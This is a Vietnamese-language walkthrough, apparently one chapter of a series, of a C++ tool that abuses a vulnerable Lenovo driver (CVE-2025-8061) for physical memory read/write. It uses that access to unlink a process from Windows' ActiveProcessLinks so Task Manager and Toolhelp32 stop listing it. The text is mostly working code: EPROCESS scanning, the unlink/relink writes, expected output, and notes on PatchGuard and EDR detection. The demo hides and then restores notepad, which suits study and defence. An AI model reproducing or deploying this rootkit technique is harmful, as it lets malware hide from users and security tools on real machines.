# 06 — DKOM Process Hiding (ActiveProcessLinks Unlink)

**File:** `06_dkom_hide.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** Physical read/write + Page table walk  
**Output:** Process chạy bình thường nhưng không xuất hiện trong Task Manager, Process Explorer, Toolhelp32

---

## Mục tiêu

Unlink một EPROCESS khỏi danh sách `ActiveProcessLinks` trong kernel. Kết quả: mọi user-mode API liệt kê process (Task Manager, `EnumProcesses`, `CreateToolhelp32Snapshot`, `NtQuerySystemInformation class 5`) đều không thấy process đó — nhưng process vẫn tiếp tục chạy bình thường.

---

## Lý thuyết nền

### ActiveProcessLinks — Doubly Linked List

Mỗi EPROCESS có một `LIST_ENTRY` tại offset `+0x448`:

```
struct LIST_ENTRY {
    LIST_ENTRY *Flink;  // +0x448: trỏ đến NEXT EPROCESS's links
    LIST_ENTRY *Blink;  // +0x450: trỏ đến PREV EPROCESS's links
};
```

Đây là **circular doubly linked list** — System process (PID 4) là head, các process khác nối tiếp nhau. Khi kernel enumerate processes, nó walk list này từ `PsActiveProcessHead`.

**Quan trọng**: các giá trị Flink/Blink là VA (Virtual Address) trỏ đến `EPROCESS+0x448` của process kế tiếp, KHÔNG phải trỏ đến đầu EPROCESS.

### Unlink operation

```
Trước:
  prev_links ←→ target_links ←→ next_links

Sau unlink:
  prev_links ←→ next_links
  (target_links vẫn giữ Flink/Blink cũ, không ai trỏ đến nó nữa)
```

Cụ thể:
```
prev->Flink = target->Flink   (bỏ qua target khi đi forward)
next->Blink = target->Blink   (bỏ qua target khi đi backward)
```

### PatchGuard có check ActiveProcessLinks không?

Trên **Windows 10+ (19041 trở đi)**: **KHÔNG**. Microsoft đã quyết định không protect APL vì có quá nhiều legitimate software (monitoring tools, security products) cũng modify nó. Đây là lý do technique DKOM **stable** trên modern Windows.

(Khác với PPL Protection byte và g_CiOptions — những thứ đó PG có check.)

---

## Giải thích code từng dòng

### DkomSave struct

```cpp
struct DkomSave {
    uint64_t target_links_va; // VA của target->ActiveProcessLinks (+0x448)
    uint64_t flink_va;        // original Flink: VA của next's links
    uint64_t blink_va;        // original Blink: VA của prev's links
};
```

Save state để restore sau.

### FindEprocByPid() — enhanced validation

```cpp
for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
    // Check PID
    if (*(ULONG_PTR*)(buf+off+0x440) != pid) continue;
    // Check name
    if (_strnicmp((char*)(buf+off+0x5A8), stem, slen) != 0) continue;
    
    // Extra validation: Flink và Blink phải là valid kernel VAs
    uint64_t fl = *(uint64_t*)(buf+off+0x448);
    uint64_t bl = *(uint64_t*)(buf+off+0x450);
    if ((fl >> 48) != 0xFFFF || (bl >> 48) != 0xFFFF) continue;
    // Canonical kernel VA: bits [63:48] = 0xFFFF
    
    // Flink != Blink: process không nên là node đơn lẻ
    if (fl == bl) continue;
    
    found_pa = pa + off;
```

Kiểm tra thêm Flink/Blink hợp lệ giảm false positive đáng kể. EPROCESS giả (garbage data) sẽ không có Flink/Blink trong kernel VA range.

### HideProcess() — unlink logic chi tiết

```cpp
static bool HideProcess(uint64_t cr3, uint64_t eproc_pa, DkomSave *s)
{
    // Bước 1: đọc Flink và Blink của target từ physical memory
    PhysReadU64(eproc_pa + 0x448, &s->flink_va);  // → next's links VA
    PhysReadU64(eproc_pa + 0x450, &s->blink_va);  // → prev's links VA
    
    printf("    Flink = 0x%016llX  (→ next's links)\n", s->flink_va);
    printf("    Blink = 0x%016llX  (→ prev's links)\n", s->blink_va);
```

Chú ý: `eproc_pa + 0x448` là physical address của Flink field. `eproc_pa + 0x450` là Blink (`0x448 + 8` vì LIST_ENTRY = 2 × UINT64).

```cpp
    // Bước 2: lấy VA của target's own links
    // next->Blink trỏ NGƯỢC LẠI về target's links
    // → đọc next->Blink sẽ cho ta target_links_va
    
    uint64_t next_blink_pa = VaToPa(cr3, s->flink_va + 8);
    // s->flink_va = VA của next's Flink
    // s->flink_va + 8 = VA của next's Blink
    // VaToPa chuyển sang PA để đọc physical
    
    PhysReadU64(next_blink_pa, &s->target_links_va);
    // = VA của target's LIST_ENTRY (target_eproc_va + 0x448)
```

Tại sao cần `target_links_va`? Để restore sau, ta cần biết VA của target's links để point prev và next trở lại vào nó.

```cpp
    // Bước 3: unlink
    // prev->Flink = next's links (bỏ qua target)
    uint64_t prev_flink_pa = VaToPa(cr3, s->blink_va);
    // s->blink_va = VA của prev's Flink field (prev's LIST_ENTRY start = prev_links.Flink)
    
    uint64_t next_blink_pa2 = VaToPa(cr3, s->flink_va + 8);
    // s->flink_va + 8 = VA của next's Blink field
    
    PhysWriteU64(prev_flink_pa,  s->flink_va);  // prev->Flink = next's links
    PhysWriteU64(next_blink_pa2, s->blink_va);  // next->Blink = prev's links
    
    return true;
```

Sau hai write này, `prev` và `next` nối thẳng với nhau, bỏ qua `target`. Kernel walk list sẽ không thấy `target` nữa.

### IsVisible() — check qua Toolhelp32

```cpp
static bool IsVisible(DWORD pid)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32First(snap, &pe)) {
        do { if (pe.th32ProcessID == pid) { found = true; break; } }
        while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}
```

`CreateToolhelp32Snapshot` → kernel calls `NtQuerySystemInformation(SystemProcessInformation)` → kernel walks `ActiveProcessLinks`. Sau khi unlink, kernel walk bỏ qua target → `found = false`.

### Demo: Process còn sống dù hidden

```cpp
// Process vẫn chạy dù không xuất hiện trong list
HANDLE prove = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, target_pid);
printf("OpenProcess(%lu) = %s  ← hidden but STILL RUNNING\n",
       target_pid,
       prove ? "SUCCESS" : "FAILED (may have exited)");
```

`OpenProcess` dùng PID lookup trực tiếp (không phải APL walk) → vẫn có thể open handle. Chứng minh process alive.

### UnhideProcess() — re-link

```cpp
static bool UnhideProcess(uint64_t cr3, uint64_t eproc_pa, const DkomSave &s)
{
    // Restore target's own Flink/Blink (tường minh, dù có thể đã không bị xóa)
    PhysWriteU64(eproc_pa + 0x448, s.flink_va);  // target->Flink = next
    PhysWriteU64(eproc_pa + 0x450, s.blink_va);  // target->Blink = prev
    
    // Point prev và next trở lại target
    uint64_t prev_flink_pa = VaToPa(cr3, s.blink_va);      // prev's Flink field
    uint64_t next_blink_pa = VaToPa(cr3, s.flink_va + 8);  // next's Blink field
    
    PhysWriteU64(prev_flink_pa, s.target_links_va);  // prev->Flink = target's links
    PhysWriteU64(next_blink_pa, s.target_links_va);  // next->Blink = target's links
    
    return true;
}
```

4 write: 2 cái restore internal state của target, 2 cái point prev/next trở lại target. Sau đó list hoàn toàn intact.

### Main flow với notepad demo

```cpp
if (argc >= 2) {
    target_pid = (DWORD)atoi(argv[1]);  // user cung cấp PID
} else {
    // Spawn notepad để demo
    STARTUPINFOA si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    CreateProcessA(nullptr, (LPSTR)"notepad.exe", ...);
    target_pid = pi.dwProcessId;
    Sleep(600);  // đợi notepad khởi tạo xong (load DLL, create window)
```

---

## Kết quả expected

```
[*] Toolhelp32 snapshot BEFORE hide:
    PID 1234   visible = YES [confirmed]

[*] Unlinking from ActiveProcessLinks...
    Flink = 0xFFFF88012345448  (→ next's links)
    Blink = 0xFFFF88087654448  (→ prev's links)
[+] UNLINKED

[*] Toolhelp32 snapshot AFTER hide:
    PID 1234   visible = NO  ← HIDDEN
    OpenProcess(1234) = SUCCESS  ← hidden but STILL RUNNING

[*] Re-linking EPROCESS...
[+] RE-LINKED

[*] Toolhelp32 snapshot AFTER restore:
    PID 1234   visible = YES [restored]
```

---

## Stability

| Vấn đề | Giải thích |
|--------|-----------|
| PatchGuard | **Không check APL trên Win10+** — stable |
| Process exit khi đang hidden | Kernel có thể có vấn đề khi EPROCESS bị free trong khi bị unlinked. Trong demo ta restore trước khi terminate |
| NtQuerySystemInformation | Đây là thứ duy nhất bị blind — handle lookup, callback lookup vẫn work |
| EDR detection | Một số EDR detect bằng cách so sánh APL list với callback list — nếu có callback cho process X nhưng X không trong APL → alert |

---

## Tóm tắt flow

```
Spawn notepad.exe → target_pid = 1234

IsVisible(1234) = TRUE ✓ (before)

GetSystemCR3() → cr3
FindEprocByPid(1234, "notepad") → eproc_pa = 0xPA...

HideProcess(cr3, eproc_pa):
    read Flink, Blink
    prev->Flink = Flink
    next->Blink = Blink
    → list bypasses target

IsVisible(1234) = FALSE ✓ (hidden!)
OpenProcess(1234) = SUCCESS ✓ (still alive!)

UnhideProcess(cr3, eproc_pa):
    restore target->Flink, target->Blink
    prev->Flink = target_links_va
    next->Blink = target_links_va

IsVisible(1234) = TRUE ✓ (restored)
```
